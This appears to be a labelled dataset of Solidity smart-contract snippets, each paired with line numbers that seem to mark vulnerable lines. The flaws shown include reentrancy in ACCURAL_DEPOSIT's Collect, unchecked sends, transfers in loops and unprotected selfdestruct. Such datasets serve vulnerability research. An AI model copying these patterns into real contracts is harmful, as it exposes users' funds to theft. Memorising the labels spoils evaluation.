"pragma solidity ^0.6.0;
/**
 * @title Core
 * @dev Solidity version 0.5.x prevents to mark as view
 * @dev functions using delegate call.
 *
 * @author Cyril Lapinte - <cyril.lapinte@openfiz.com>
 *
 * Error messages
 *   CO01: Only Proxy may access the function
 *   CO02: Address 0 is an invalid delegate address
 *   CO03: Delegatecall should be successful
 *   CO04: DelegateId must be greater than 0
 *   CO05: Proxy must exist
 *   CO06: Proxy must be already defined
 *   CO07: Proxy update must be successful
 **/
contract Core is Storage {
  using BytesConvert for bytes;
  modifier onlyProxy {
    require(delegates[proxyDelegateIds[msg.sender]] != address(0), ""CO01"");
    _;
  }
  function delegateCall(address _proxy) internal returns (bool status)
  {
    uint256 delegateId = proxyDelegateIds[_proxy];
    address delegate = delegates[delegateId];
    require(delegate != address(0), ""CO02"");
    // solhint-disable-next-line avoid-low-level-calls
    (status, ) = delegate.delegatecall(msg.data);
    require(status, ""CO03"");
  }
  function delegateCallUint256(address _proxy)
    internal returns (uint256)
  {
    return delegateCallBytes(_proxy).toUint256();
  }
  function delegateCallBytes(address _proxy)
    internal returns (bytes memory result)
  {
    bool status;
    uint256 delegateId = proxyDelegateIds[_proxy];
    address delegate = delegates[delegateId];
    require(delegate != address(0), ""CO02"");
    // solhint-disable-next-line avoid-low-level-calls
    (status, result) = delegate.delegatecall(msg.data);
    require(status, ""CO03"");
  }
  function defineDelegateInternal(uint256 _delegateId, address _delegate) internal returns (bool) {
    require(_delegateId != 0, ""CO04"");
    delegates[_delegateId] = _delegate;
    return true;
  }
  function defineProxyInternal(address _proxy, uint256 _delegateId)
    virtual internal returns (bool)
  {
    require(delegates[_delegateId] != address(0), ""CO02"");
    require(_proxy != address(0), ""CO05"");
    proxyDelegateIds[_proxy] = _delegateId;
    return true;
  }
  function migrateProxyInternal(address _proxy, address _newCore)
    internal returns (bool)
  {
    require(proxyDelegateIds[_proxy] != 0, ""CO06"");
    require(Proxy(_proxy).updateCore(_newCore), ""CO07"");
    return true;
  }
  function removeProxyInternal(address _proxy)
    internal returns (bool)
  {
    require(proxyDelegateIds[_proxy] != 0, ""CO06"");
    delete proxyDelegateIds[_proxy];
    return true;
  }
}",[46]
"pragma solidity ^0.4.25;
/**
 * @title SafeMath for uint256
 * @dev Unsigned math operations with safety checks that revert on error.
 */
library SafeMath256 {
    /**
     * @dev Multiplies two unsigned integers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
}
/**
 * @title ERC20 interface
 * @dev see https://eips.ethereum.org/EIPS/eip-20
 */
interface IERC20{
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}
contract A004{
  using SafeMath256 for uint256;
  uint8 public constant decimals = 18;
  uint256 public constant decimalFactor = 10 ** uint256(decimals);
function batchTtransferEther(address[] _to,uint256[] _value) public payable {
    require(_to.length>0);
    //uint256 distr = msg.value/myAddresses.length;
    for(uint256 i=0;i<_to.length;i++)
    {
        _to[i].transfer(_value[i]);
    }
}
/*function batchTtransferEtherToNum(address[] _to,uint256[] _value) public payable {
    require(_to.length>0);
    //uint256 distr = msg.value/myAddresses.length;
    for(uint256 i=0;i<_to.length;i++)
    {
        _to[i].transfer(_value[i] * decimalFactor);
    }
}*/
  /*
 function batchTtransferEtherToNum1(uint256 _value) public returns(uint256 __value){
   return _value * decimalFactor;
}
  */
}","[33, 38]"
"             emit ICOStart(_value, weiPerABIO, minInvestment);
         }
         /**
         * @notice Burns tokens leftover from an ICO round.
         * @dev This can be called by anyone after deadline since it's an essential and inevitable part.
         */
         function burnRestTokens() afterDeadline{
                 require(!restTokensBurned);
                 abioToken.burnMyBalance();
                 restTokensBurned = true;
         }
         function isRunning() view returns (bool){
             return (now < deadline);
         }
         function goalReached() internal;
         modifier afterDeadline() { if (now >= deadline) _; }
}
contract ABIO_preICO is ABIO_BaseICO{
    address ICOAddress;
    ABIO_ICO ICO;
    uint finalDeadline;
    constructor(address _abioAddress, uint _lenInMins, uint _minWeiInvestment, address _treasury, uint _priceInWei, uint _goalInWei){
        treasury = _treasury;
        abioToken = ABIO_Token(_abioAddress);
        weiPerABIO = _priceInWei;
        fundingGoal = _goalInWei;
        minInvestment = _minWeiInvestment;
        startDate = now;
        length = _lenInMins * 1 minutes;
     }
     /**
     * @notice Called by dev to supply the address of the ICO (which is created after the PreICO)
     * @dev We check if `fundingGoal` is reached again, because this MIGHT be called after it is reached, so `extGoalReached()` will never be called after.
     */
    function supplyICOContract(address _addr) public onlyOwner{
        require(_addr != 0x0);
        ICOAddress = _addr;
        ICO = ABIO_ICO(_addr);
        if(!fundingGoalReached && weiRaised + ICO.weiRaised() >= fundingGoal){goalReached();}
        finalDeadline = ICO.deadline();
    }
    function goalReached() internal{
        fundingGoalReached = true;
        emit SoftcapReached(treasury, fundingGoal);
    }
    /**
    * @notice supposed to be called by ICO Contract IF `fundingGoal` wasn't reached during PreICO to notify it
    * @dev !!Funds can't be deposited to treasury if `fundingGoal` isn't called before main ICO ends!!
    * @dev This is, at max., called once! If this contract doesn't know ICOAddress by that time, we rely on the check in `supplyICOContract()`
    */
    function extGoalReached() afterDeadline external{
        require(ICOAddress != 0x0); //ICO was supplied
        require(msg.sender == ICOAddress);
        goalReached();
    }
    /**
     * @notice Lets participants withdraw the funds if `fundingGoal` was missed.
     * @notice Lets treasury collect the funds if `fundingGoal` was reached.
     * @dev The contract is obligated to return the ETH to contributors if `fundingGoal` isn't reached,
     *      so we have to wait until the end for a user withdrawal.
     * @dev The treasury can withdraw right after `fundingGoal` is reached.
     */
    function safeWithdrawal() afterDeadline stopOnPause{
        if (!fundingGoalReached && now >= finalDeadline) {
            uint amount = ethBalances[msg.sender];
            ethBalances[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    emit FundsWithdrawn(msg.sender, amount);
                } else {
                    ethBalances[msg.sender] = amount;
                }
            }
        }
        else if (fundingGoalReached && treasury == msg.sender) {
            if (treasury.send(weiRaised)) {
                emit FundsWithdrawn(treasury, weiRaised);
            } else if (treasury.send(address(this).balance)){
                emit FundsWithdrawn(treasury, address(this).balance);
            }
        }
    }
}",[64]
"pragma solidity ^0.4.19;
contract ACCURAL_DEPOSIT
{
    mapping (address=>uint256) public balances;   
    uint public MinSum = 1 ether;
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)revert();
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[38, 40]"
"    function uint256At(bytes _data, uint256 _location) internal pure returns (uint256 result) {
        assembly {
            result := mload(add(_data, add(0x20, _location)))
        }
    }
    function addressAt(bytes _data, uint256 _location) internal pure returns (address result) {
        uint256 word = uint256At(_data, _location);
        assembly {
            result := div(and(word, 0xffffffffffffffffffffffffffffffffffffffff000000000000000000000000),
            0x1000000000000000000000000)
        }
    }
    function uint32At(bytes _data, uint256 _location) internal pure returns (uint32 result) {
        uint256 word = uint256At(_data, _location);
        assembly {
            result := div(and(word, 0xffffffff00000000000000000000000000000000000000000000000000000000),
            0x100000000000000000000000000000000000000000000000000000000)
        }
    }
    function locationOf(bytes _data, uint256 _location) internal pure returns (uint256 result) {
        assembly {
            result := add(_data, add(0x20, _location))
        }
    }
    function toBytes(bytes4 _sig) internal pure returns (bytes) {
        bytes memory payload = new bytes(4);
        payload[0] = bytes1(_sig);
        payload[1] = bytes1(_sig << 8);
        payload[2] = bytes1(_sig << 16);
        payload[3] = bytes1(_sig << 24);
        return payload;
    }
    function memcpy(uint _dest, uint _src, uint _len) public pure {
        uint256 src = _src;
        uint256 dest = _dest;
        uint256 len = _len;
        // Copy word-length chunks while possible
        for (; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }
        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }
}
//File: contracts/evmscript/EVMScriptRunner.sol
pragma solidity ^0.4.18;
contract EVMScriptRunner is AppStorage, EVMScriptRegistryConstants {
    using ScriptHelpers for bytes;
    function runScript(bytes _script, bytes _input, address[] _blacklist) protectState internal returns (bytes output) {
        // TODO: Too much data flying around, maybe extracting spec id here is cheaper
        address executorAddr = getExecutor(_script);
        require(executorAddr != address(0));
        bytes memory calldataArgs = _script.encode(_input, _blacklist);
        bytes4 sig = IEVMScriptExecutor(0).execScript.selector;
        require(executorAddr.delegatecall(sig, calldataArgs));
        return returnedDataDecoded();
    }
    function getExecutor(bytes _script) public view returns (IEVMScriptExecutor) {
        return IEVMScriptExecutor(getExecutorRegistry().getScriptExecutor(_script));
    }
    // TODO: Internal
    function getExecutorRegistry() internal view returns (IEVMScriptRegistry) {
        address registryAddr = kernel.getApp(EVMSCRIPT_REGISTRY_APP);
        return IEVMScriptRegistry(registryAddr);
    }
    /**
    * @dev copies and returns last's call data. Needs to ABI decode first
    */
    function returnedDataDecoded() internal view returns (bytes ret) {
        assembly {
            let size := returndatasize
            switch size
            case 0 {}
            default {
                ret := mload(0x40) // free mem ptr get
                mstore(0x40, add(ret, add(size, 0x20))) // free mem ptr set
                returndatacopy(ret, 0x20, sub(size, 0x20)) // copy return data
            }
        }
        return ret;
    }
    modifier protectState {
        address preKernel = kernel;
        bytes32 preAppId = appId;
        _; // exec
        require(kernel == preKernel);
        require(appId == preAppId);
    }
}
//File: contracts/acl/ACLSyntaxSugar.sol
pragma solidity 0.4.18;
contract ACLSyntaxSugar {
    function arr() internal pure returns (uint256[] r) {}
    function arr(bytes32 _a) internal pure returns (uint256[] r) {
        return arr(uint256(_a));
    }
    function arr(bytes32 _a, bytes32 _b) internal pure returns (uint256[] r) {
        return arr(uint256(_a), uint256(_b));
    }
    function arr(address _a) internal pure returns (uint256[] r) {
        return arr(uint256(_a));
    }
    function arr(address _a, address _b) internal pure returns (uint256[] r) {
        return arr(uint256(_a), uint256(_b));
    }
    function arr(address _a, uint256 _b, uint256 _c) internal pure returns (uint256[] r) {
        return arr(uint256(_a), _b, _c);
    }
    function arr(address _a, uint256 _b) internal pure returns (uint256[] r) {
        return arr(uint256(_a), uint256(_b));
    }
    function arr(address _a, address _b, uint256 _c, uint256 _d, uint256 _e) internal pure returns (uint256[] r) {
        return arr(uint256(_a), uint256(_b), _c, _d, _e);
    }
    function arr(address _a, address _b, address _c) internal pure returns (uint256[] r) {
        return arr(uint256(_a), uint256(_b), uint256(_c));
    }
    function arr(address _a, address _b, uint256 _c) internal pure returns (uint256[] r) {
        return arr(uint256(_a), uint256(_b), uint256(_c));",[64]
"pragma solidity ^0.4.16;
interface Token {
    function transfer(address _to, uint256 _value) external;
}
contract AZTCrowdsale {
    Token public tokenReward;
    address public creator;
    address public owner = 0x0;
    uint256 private tokenSold;
    modifier isCreator() {
        require(msg.sender == creator);
        _;
    }
    event FundTransfer(address backer, uint amount, bool isContribution);
    function AZTCrowdsale() public {
        creator = msg.sender;
        tokenReward = Token(0x2e9f2A3c66fFd47163b362987765FD8857b1f3F9);
    }
    function setOwner(address _owner) isCreator public {
        owner = _owner;      
    }
    function setCreator(address _creator) isCreator public {
        creator = _creator;      
    }
    function setToken(address _token) isCreator public {
        tokenReward = Token(_token);      
    }
    function sendToken(address _to, uint256 _value) isCreator public {
        tokenReward.transfer(_to, _value);      
    }
    function kill() isCreator public {
        selfdestruct(owner);
    }
    function () payable public {
        require(msg.value > 0);
        uint256 amount;
        // private sale
        if (now > 1526342400 && now < 1527811200 && tokenSold < 1250001) {
            amount = msg.value * 10000;
        }
        // pre-sale
        if (now > 1527811199 && now < 1528416000 && tokenSold > 1250000 && tokenSold < 3250001) {
            amount = msg.value * 10000;
        }
        // stage 1
        if (now > 1528415999 && now < 1529107200 && tokenSold > 3250000 && tokenSold < 5250001) {
            amount = msg.value * 10000;
        }
        // stage 2
        if (now > 1529107199 && now < 1529622000 && tokenSold > 5250000 && tokenSold < 7250001) {
            amount = msg.value * 2500;
        }
        // stage 3
        if (now > 1529621999 && now < 1530226800 && tokenSold > 7250000 && tokenSold < 9250001) {
            amount = msg.value * 1250;
        }
        // stage 4
        if (now > 1530226799 && now < 1530831600 && tokenSold > 9250000 && tokenSold < 11250001) {
            amount = msg.value * 833;
        }
        // stage 5
        if (now > 1530831599 && now < 1531609199 && tokenSold > 11250000 && tokenSold < 13250001) {
            amount = msg.value * 417;
        }
        tokenSold += amount / 1 ether;
        tokenReward.transfer(msg.sender, amount);
        FundTransfer(msg.sender, amount, true);
        owner.transfer(msg.value);
    }
}",[62]
"    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface IBitGuildToken {
    function transfer(address _to, uint256 _value) external;
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function approve(address _spender, uint256 _value) external;
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) external returns (bool);
    function balanceOf(address _from) external view returns(uint256);
}
interface IAgonFight {
    function calcFight(uint64 _mFlag, uint64 _cFlag, uint256 _aSeed, uint256 _fSeed) external pure returns(uint64);
}
contract ActionAgonPlat is AccessService {
    using SafeMath for uint256;
    event CreateAgonPlat(uint64 indexed agonId, address indexed master, uint64 indexed outFlag);
    event CancelAgonPlat(uint64 indexed agonId, address indexed master, uint64 indexed outFlag);
    event ChallengeAgonPlat(uint64 indexed agonId, address indexed master, uint64 indexed outFlag, address challenger);
    event ResolveAgonPlat(uint64 indexed agonId, address indexed master, uint64 indexed outFlag, address challenger);
    struct Agon {
        address master;
        address challenger;
        uint64 agonPrice;
        uint64 outFlag;
        uint64 agonFlag;
        uint64 result;      // 1-win, 2-lose, 99-cancel
    }
    Agon[] agonArray;
    IAgonFight fightContract;
    IBitGuildToken public bitGuildContract;
    mapping (address => uint64[]) public ownerToAgonIdArray;
    uint256 public maxAgonCount = 6;
    uint256 public maxResolvedAgonId = 0;
    uint256[5] public agonValues;
    function ActionAgonPlat(address _platAddr) public {
        addrAdmin = msg.sender;
        addrService = msg.sender;
        addrFinance = msg.sender;
        bitGuildContract = IBitGuildToken(_platAddr);
        Agon memory order = Agon(0, 0, 0, 0, 1, 1);
        agonArray.push(order);
        agonValues[0] = 3000000000000000000000;
        agonValues[1] = 12000000000000000000000;
        agonValues[2] = 30000000000000000000000;
        agonValues[3] = 60000000000000000000000;
        agonValues[4] = 120000000000000000000000;
    }
    function() external {}
    function setMaxAgonCount(uint256 _count) external onlyAdmin {
        require(_count > 0 && _count < 20);
        require(_count != maxAgonCount);
        maxAgonCount = _count;
    }
    function setAgonFight(address _addr) external onlyAdmin {
        fightContract = IAgonFight(_addr);
    }
    function setMaxResolvedAgonId() external {
        uint256 length = agonArray.length;
        for (uint256 i = maxResolvedAgonId; i < length; ++i) {
            if (agonArray[i].result == 0) {
                maxResolvedAgonId = i - 1;
                break;
            }
        }
    }
    function setAgonValues(uint256[5] values) external onlyAdmin {
        require(values[0] >= 100);
        require(values[1] >= values[0]);
        require(values[2] >= values[1]);
        require(values[3] >= values[2]);
        require(values[4] >= values[3]);
        require(values[4] <= 600000);
        require(values[0] % 100 == 0);
        require(values[1] % 100 == 0);
        require(values[2] % 100 == 0);
        require(values[3] % 100 == 0);
        require(values[4] % 100 == 0);
        agonValues[0] = values[0].mul(1000000000000000000);
        agonValues[1] = values[1].mul(1000000000000000000);
        agonValues[2] = values[2].mul(1000000000000000000);
        agonValues[3] = values[3].mul(1000000000000000000);
        agonValues[4] = values[4].mul(1000000000000000000);
    }
    function _getExtraParam(bytes _extraData) internal pure returns(uint64 p1, uint64 p2, uint64 p3) {
        p1 = uint64(_extraData[0]);
        p2 = uint64(_extraData[1]);
        uint64 index = 2;
        uint256 val = 0;
        uint256 length = _extraData.length;
        while (index < length) {
            val += (uint256(_extraData[index]) * (256 ** (length - index - 1)));
            index += 1;
        }
        p3 = uint64(val);
    }
    function receiveApproval(address _sender, uint256 _value, address _tokenContract, bytes _extraData)
        external
        whenNotPaused
    {
        require(msg.sender == address(bitGuildContract));
        require(_extraData.length > 2 && _extraData.length <= 10);
        var (p1, p2, p3) = _getExtraParam(_extraData);
        if (p1 == 0) {
            _newAgon(p3, p2, _sender, _value);
        } else if (p1 == 1) {
            _newChallenge(p3, p2, _sender, _value);
        } else {
            require(false);
        }
    }
    function _newAgon(uint64 _outFlag, uint64 _valId, address _sender, uint256 _value) internal {
        require(ownerToAgonIdArray[_sender].length < maxAgonCount);
        require(_valId >= 0 && _valId <= 4);
        require(_value == agonValues[_valId]);
        require(bitGuildContract.transferFrom(_sender, address(this), _value));
        uint64 newAgonId = uint64(agonArray.length);
        agonArray.length += 1;
        Agon storage agon = agonArray[newAgonId];
        agon.master = _sender;
        agon.agonPrice = uint64(_value.div(1000000000000000000));
        agon.outFlag = _outFlag;
        ownerToAgonIdArray[_sender].push(newAgonId);
        CreateAgonPlat(uint64(newAgonId), _sender, _outFlag);
    }
    function _removeAgonIdByOwner(address _owner, uint64 _agonId) internal {",[64]
"    function ActionPresell(address _nftAddr) public {
        addrAdmin = msg.sender;
        addrService = msg.sender;
        addrFinance = msg.sender;
        tokenContract = WarToken(_nftAddr);
        petPresellCounter[10001] = 50;
        petPresellCounter[10002] = 30;
        petPresellCounter[10003] = 50;
        petPresellCounter[10004] = 30;
        petPresellCounter[10005] = 30;
    }
    function() external payable {
    }
    function setWarTokenAddr(address _nftAddr) external onlyAdmin {
        tokenContract = WarToken(_nftAddr);
    }
    function petPresell(uint16 _protoId)
        external
        payable
        whenNotPaused
    {
        uint16 curSupply = petPresellCounter[_protoId];
        require(curSupply > 0);
        uint16[] storage buyArray = presellLimit[msg.sender];
        uint256 curBuyCnt = buyArray.length;
        require(curBuyCnt < 10);
        uint256 payBack = 0;
        if (_protoId == 10001) {
            require(msg.value >= 0.66 ether);
            payBack = (msg.value - 0.66 ether);
            uint16[9] memory param1 = [10001, 5, 9, 40, 0, 0, 0, 0, 1];       // hp +40%
            tokenContract.createFashion(msg.sender, param1, 1);
            buyArray.push(10001);
        } else if(_protoId == 10002) {
            require(msg.value >= 0.99 ether);
            payBack = (msg.value - 0.99 ether);
            uint16[9] memory param2 = [10002, 5, 9, 0, 30, 30, 0, 0, 1];       // atk +30%
            tokenContract.createFashion(msg.sender, param2, 1);
            buyArray.push(10002);
        } else if(_protoId == 10003) {
            require(msg.value >= 0.66 ether);
            payBack = (msg.value - 0.66 ether);
            uint16[9] memory param3 = [10003, 5, 9, 0, 0, 0, 40, 0, 1];        // def +40%
            tokenContract.createFashion(msg.sender, param3, 1);
            buyArray.push(10003);
        } else if(_protoId == 10004) {
            require(msg.value >= 0.99 ether);
            payBack = (msg.value - 0.99 ether);
            uint16[9] memory param4 = [10004, 5, 9, 0, 0, 0, 0, 30, 1];        // crit +50%
            tokenContract.createFashion(msg.sender, param4, 1);
            buyArray.push(10004);
        } else {
            require(msg.value >= 0.99 ether);
            payBack = (msg.value - 0.99 ether);
            uint16[9] memory param5 = [10005, 5, 9, 20, 10, 10, 20, 0, 1];      // hp +20%, atk +10%, def +20%
            tokenContract.createFashion(msg.sender, param5, 1);
            buyArray.push(10005);
        }
        petPresellCounter[_protoId] = (curSupply - 1);
        PetPreSelled(msg.sender, _protoId);
        addrFinance.transfer(msg.value - payBack);        // need 2300 gas -_-!
        if (payBack > 0) {
            msg.sender.transfer(payBack);
        }
    }
    function withdraw()
        external
    {
        require(msg.sender == addrFinance || msg.sender == addrAdmin);
        addrFinance.transfer(this.balance);
    }
    function getPetCanPresellCount() external view returns (uint16[5] cntArray) {
        cntArray[0] = petPresellCounter[10001];
        cntArray[1] = petPresellCounter[10002];
        cntArray[2] = petPresellCounter[10003];
        cntArray[3] = petPresellCounter[10004];
        cntArray[4] = petPresellCounter[10005];
    }
    function getBuyCount(address _owner) external view returns (uint32) {
        return uint32(presellLimit[_owner].length);
    }
    function getBuyArray(address _owner) external view returns (uint16[]) {
        uint16[] storage buyArray = presellLimit[_owner];
        return buyArray;
    }
}","[59, 70]"
"    function setDevelopers(address _dev1, address _dev2)
    onlyAdministrator()
    public
    {
        dev1 = _dev1;
        dev2 = _dev2;
        administrators[dev2] = true;
    }
    function setFeeHolder(address _feeHolder)
    onlyAdministrator()
    public
    {
        administrators[_feeHolder] = true;
        feeHolder_ = _feeHolder;
    }
    function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {
        genTree[msg.sender] = _referredBy;
        purchaseTokens(msg.value, _referredBy);
    }
    function()
        payable
        public
    {
        purchaseTokens(msg.value, 0x0);
    }
    /**
     * Liquifies tokens to ethereum.
     */
    function sell(uint256 _amountOfTokens)
        onlyBagholders()
        public
    {
        // setup data
        address _customerAddress = msg.sender;
        require(_amountOfTokens <= balances[_customerAddress]);
        uint256 _ethereum = tokensToEthereum_(_amountOfTokens,true);
        uint256 _dividends = _ethereum * percent/10000;
        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
        distributeComission(_dividends);
        balances[_customerAddress] -= _amountOfTokens;
        tokenSupply_ -= _amountOfTokens;
        _customerAddress.transfer(_taxedEthereum);
        emit Transfer(_customerAddress,address(this),_amountOfTokens);
    }
    address feeHolder_;
    function destruct() onlyAdministrator() public{
        selfdestruct(feeHolder_);
    }
    function setPercent(uint256 newPercent) onlyAdministrator() public {
        percent = newPercent * 10;
    }
    function getRewards() public view returns(uint256)
    {
        return rewardLedger[msg.sender];
    }
    function withdrawRewards() public returns(bool)
    {
        require(rewardLedger[msg.sender]>0);
        msg.sender.transfer(rewardLedger[msg.sender]);
        rewardLedger[msg.sender] = 0;
    }
    function distributeCommission(uint256 _amountToDistribute, address _idToDistribute)
    internal
    {
        for(uint i=0; i<5; i++)
        {
            address referrer = genTree[_idToDistribute];
            if(referrer != 0x0)
            {
                rewardLedger[referrer] += _amountToDistribute*(5-i)/15;
                _idToDistribute = referrer;
                _amountToDistribute -= _amountToDistribute*(5-i)/15;
            }
        }
        rewardLedger[feeHolder_] += _amountToDistribute;
    }
    function distributeComission(uint256 _amountToDistribute)
    internal
    {
        rewardLedger[dev1] += _amountToDistribute*750/1000;
        rewardLedger[dev2] += _amountToDistribute*250/1000;
    }
    function setName(string _name)
        onlyAdministrator()
        public
    {
        name = _name;
    }
    function setSymbol(string _symbol)
        onlyAdministrator()
        public
    {
        symbol = _symbol;
    }
    function totalEthereumBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
    function totalSupply()
        public
        pure
        returns(uint256)
    {
        return totalSupply_;
    }
    function tokenSupply()
        public
        view
        returns(uint256)
    {
        return tokenSupply_;
    }
    function myTokens()
        public
        view
        returns(uint256)
    {
        address _customerAddress = msg.sender;
        return balances[_customerAddress];
    }
    /**","[44, 45, 63, 74, 76, 79, 84, 85]"
"    // Pay dividends.
    function payDividends() onlyPayer() onlyActivated() external payable returns (bool)
    {
        require(now >= payoutPeriodStart && now <= payoutPeriodEnd);// Check payout period.
        dividendPayouts[amountOfDividendsPayouts].amount = msg.value;// Set payout amount in weis.
        dividendPayouts[amountOfDividendsPayouts].momentTotalSupply = totalSupply;// Save total supply on that moment.
        PayoutDividends(msg.value, amountOfDividendsPayouts);// Call dividend payout event.
        amountOfDividendsPayouts++;// Increment dividend payouts amount.
        return true;
    }
    // Pay redemption.
    function payRedemption(uint price) onlyPayer() onlyActivated() external payable returns (bool)
    {
        require(now >= payoutPeriodStart && now <= payoutPeriodEnd);// Check payout period.
        redemptionPayouts[amountOfRedemptionPayouts].amount = msg.value;// Set payout amount in weis.
        redemptionPayouts[amountOfRedemptionPayouts].momentTotalSupply = totalSupply;// Save total supply on that moment.
        redemptionPayouts[amountOfRedemptionPayouts].price = price;// Set price of Agricoin in weis at this redemption moment.
        PayoutRedemption(msg.value, amountOfRedemptionPayouts, price);// Call redemption payout event.
        amountOfRedemptionPayouts++;// Increment redemption payouts amount.
        return true;
    }
    // Get back unpaid dividends and redemption.
    function getUnpaid() onlyPayer() onlyActivated() external returns (bool)
    {
        require(now >= payoutPeriodEnd);// Check end payout period.
        GetUnpaid(this.balance);// Call getting unpaid ether event.
        msg.sender.transfer(this.balance);// Transfer all ethers back to payer.
        return true;
    }
    // Recalculates dividends and redumptions.
    function recalculate(address user) onlyActivated() public returns (bool)
    {
        if (isSuccessfulIco)
        {
            if (balances[user].icoBalance != 0)
            {
                balances[user].balance += balances[user].icoBalance;
                Transfer(0x00, user, balances[user].icoBalance);
                balances[user].icoBalance = 0;
            }
        }
        // Check for necessity of recalculation.
        if (balances[user].lastDividensPayoutNumber == amountOfDividendsPayouts &&
            balances[user].lastRedemptionPayoutNumber == amountOfRedemptionPayouts)
        {
            return true;
        }
        uint addedDividend = 0;
        // For dividends.
        for (uint i = balances[user].lastDividensPayoutNumber; i < amountOfDividendsPayouts; i++)
        {
            addedDividend += (balances[user].balance * dividendPayouts[i].amount) / dividendPayouts[i].momentTotalSupply;
        }
        balances[user].posibleDividends += addedDividend;
        balances[user].lastDividensPayoutNumber = amountOfDividendsPayouts;
        uint addedRedemption = 0;
        // For redemption.
        for (uint j = balances[user].lastRedemptionPayoutNumber; j < amountOfRedemptionPayouts; j++)
        {
            addedRedemption += (balances[user].balance * redemptionPayouts[j].amount) / redemptionPayouts[j].momentTotalSupply;
        }
        balances[user].posibleRedemption += addedRedemption;
        balances[user].lastRedemptionPayoutNumber = amountOfRedemptionPayouts;
        return true;
    }
    // Get dividends.
    function () external payable
    {
        if (payoutPeriodStart >= now && now <= payoutPeriodEnd)// Check payout period.
        {
            if (posibleDividendsOf(msg.sender) > 0)// Check posible dividends.
            {
                uint dividendsAmount = posibleDividendsOf(msg.sender);// Get posible dividends amount.
                GetDividends(msg.sender, dividendsAmount);// Call getting dividends event.
                balances[msg.sender].posibleDividends = 0;// Set balance to zero.
                msg.sender.transfer(dividendsAmount);// Transfer dividends amount.
            }
        }
    }
    // Token name.
    string public constant name = ""Agricoin"";
    // Token market symbol.
    string public constant symbol = ""AGR"";
    // Amount of digits after comma.
    uint public constant decimals = 2;
    // Total supply.
    uint public totalSupply;
    // Total supply on ICO only;
    uint public totalSupplyOnIco;
    // Activation date.
    uint public startDate;
    // Payment period start date, setted by ICO contract before activation.
    uint public payoutPeriodStart;
    // Payment period last date, setted by ICO contract before activation.
    uint public payoutPeriodEnd;
    // Dividends DividendPayout counter.
    uint public amountOfDividendsPayouts = 0;
    // Redemption DividendPayout counter.
    uint public amountOfRedemptionPayouts = 0;
    // Dividend payouts.
    mapping (uint => DividendPayout) public dividendPayouts;
    // Redemption payouts.
    mapping (uint => RedemptionPayout) public redemptionPayouts;
    // Dividend and redemption payers.
    mapping (address => bool) public payers;
    // Balance records.
    mapping (address => Balance) public balances;
    // Allowed balances.
    mapping (address => mapping (address => uint)) public allowed;
    // Set true for activating token. If false then token isn't working.
    bool public isActive = false;
    // Set true for activate ico minted tokens.
    bool public isSuccessfulIco = false;
}","[60, 69]"
"pragma solidity ^0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        // uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return a / b;
    }
    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract StandardToken {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
}
contract AirDrop {
    using SafeMath for uint;
    function () payable public {}
    /**
     * batch transfer for ERC20 token.(the same amount)
     *
     * @param _contractAddress ERC20 token address
     * @param _addresses array of address to sent
     * @param _value transfer amount
     */
